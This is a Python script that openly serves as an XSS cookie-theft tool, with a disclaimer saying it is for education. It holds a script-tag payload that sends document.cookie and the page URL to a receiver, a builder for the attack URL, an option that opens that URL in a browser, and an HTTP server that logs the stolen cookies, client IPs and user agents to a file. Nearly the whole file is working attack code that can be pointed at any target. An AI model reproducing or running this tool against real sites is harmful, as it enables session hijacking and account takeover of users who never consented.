#!/usr/bin/env python3
"""
XSS Cookie Stealing Attack Script
This script demonstrates how to execute an XSS attack to steal cookies.
WARNING: For educational purposes only. Only use on systems you own or have permission to test.
"""

import urllib.parse
import webbrowser
import sys
import http.server
import socketserver
import threading
import json
import base64
from datetime import datetime

# Configuration
COOKIE_RECEIVER_PORT = 8080
VULNERABLE_PAGE_URL = "http://localhost/vulnerable_page.php"
COOKIE_RECEIVER_URL = f"http://localhost:{COOKIE_RECEIVER_PORT}/cookie_receiver.php"

class CookieReceiverHandler(http.server.SimpleHTTPRequestHandler):
    """HTTP server to receive stolen cookies"""
    
    def do_GET(self):
        """Handle GET requests (cookie theft attempts)"""
        if self.path.startswith('/cookie_receiver.php'):
            # Parse query parameters
            from urllib.parse import urlparse, parse_qs
            parsed = urlparse(self.path)
            params = parse_qs(parsed.query)
            
            cookie = params.get('cookie', [''])[0]
            url = params.get('url', [''])[0]
            
            if cookie:
                # Log the stolen cookie
                log_entry = {
                    'timestamp': datetime.now().isoformat(),
                    'ip_address': self.client_address[0],
                    'page_url': url,
                    'cookie': cookie,
                    'user_agent': self.headers.get('User-Agent', 'unknown')
                }
                
                print("\n" + "="*60)
                print("🍪 COOKIE STOLEN!")
                print("="*60)
                print(f"Timestamp: {log_entry['timestamp']}")
                print(f"IP Address: {log_entry['ip_address']}")
                print(f"Page URL: {log_entry['page_url']}")
                print(f"Cookie: {log_entry['cookie']}")
                print(f"User-Agent: {log_entry['user_agent']}")
                print("="*60 + "\n")
                
                # Save to file
                try:
                    with open('stolen_cookies.json', 'r') as f:
                        logs = json.load(f)
                except:
                    logs = []
                
                logs.append(log_entry)
                
                with open('stolen_cookies.json', 'w') as f:
                    json.dump(logs, f, indent=2)
                
                # Return 1x1 transparent GIF
                self.send_response(200)
                self.send_header('Content-Type', 'image/gif')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(base64.b64decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7'))
            else:
                # Show log if accessed directly
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                try:
                    with open('stolen_cookies.json', 'r') as f:
                        logs = json.load(f)
                    html = "<h1>Stolen Cookies Log</h1><pre>" + json.dumps(logs, indent=2) + "</pre>"
                except:
                    html = "<h1>Cookie Receiver</h1><p>No cookies received yet.</p>"
                self.wfile.write(html.encode())
        else:
            super().do_GET()
    
    def log_message(self, format, *args):
        """Suppress default logging"""
        pass


def generate_xss_payload(receiver_url):
    """Generate XSS payload to steal cookies"""
    payload = f"<script>var i=new Image();i.src='{receiver_url}?cookie='+encodeURIComponent(document.cookie)+'&url='+encodeURIComponent(window.location.href);</script>"
    return payload


def generate_attack_url(vulnerable_url, payload):
    """Generate the complete attack URL"""
    encoded_payload = urllib.parse.quote(payload)
    return f"{vulnerable_url}?search={encoded_payload}"


def start_cookie_receiver(port):
    """Start the cookie receiver server"""
    handler = CookieReceiverHandler
    with socketserver.TCPServer(("", port), handler) as httpd:
        print(f"🍪 Cookie Receiver Server started on port {port}")
        print(f"   Listening for stolen cookies at: http://localhost:{port}/cookie_receiver.php")
        print("   Press Ctrl+C to stop the server\n")
        httpd.serve_forever()


def main():
    import argparse
    import base64
    
    parser = argparse.ArgumentParser(
        description='XSS Cookie Stealing Attack Demonstration',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python xss_attack.py --start-server
  python xss_attack.py --generate-url
  python xss_attack.py --execute
        """
    )
    
    parser.add_argument(
        '--start-server',
        action='store_true',
        help='Start the cookie receiver server'
    )
    
    parser.add_argument(
        '--generate-url',
        action='store_true',
        help='Generate and display the attack URL'
    )
    
    parser.add_argument(
        '--execute',
        action='store_true',
        help='Generate URL and open it in browser (requires server to be running)'
    )
    
    parser.add_argument(
        '--vulnerable-url',
        default=VULNERABLE_PAGE_URL,
        help=f'URL of the vulnerable page (default: {VULNERABLE_PAGE_URL})'
    )
    
    parser.add_argument(
        '--receiver-url',
        default=COOKIE_RECEIVER_URL,
        help=f'URL of the cookie receiver (default: {COOKIE_RECEIVER_URL})'
    )
    
    parser.add_argument(
        '--port',
        type=int,
        default=COOKIE_RECEIVER_PORT,
        help=f'Port for cookie receiver server (default: {COOKIE_RECEIVER_PORT})'
    )
    
    args = parser.parse_args()
    
    if args.start_server:
        try:
            start_cookie_receiver(args.port)
        except KeyboardInterrupt:
            print("\n\nCookie receiver server stopped.")
    elif args.generate_url:
        payload = generate_xss_payload(args.receiver_url)
        attack_url = generate_attack_url(args.vulnerable_url, payload)
        print("\n" + "="*60)
        print("XSS Attack URL Generated")
        print("="*60)
        print(f"\nPayload: {payload}\n")
        print(f"Attack URL:\n{attack_url}\n")
        print("="*60 + "\n")
    elif args.execute:
        payload = generate_xss_payload(args.receiver_url)
        attack_url = generate_attack_url(args.vulnerable_url, payload)
        print(f"\nOpening attack URL in browser: {attack_url}\n")
        webbrowser.open(attack_url)
        print("Attack executed! Check the cookie receiver server for stolen cookies.")
    else:
        parser.print_help()
        print("\n" + "="*60)
        print("Quick Start:")
        print("="*60)
        print("1. Start the cookie receiver server:")
        print("   python xss_attack.py --start-server")
        print("\n2. In another terminal, generate and execute the attack:")
        print("   python xss_attack.py --execute")
        print("="*60 + "\n")


if __name__ == '__main__':
    main()

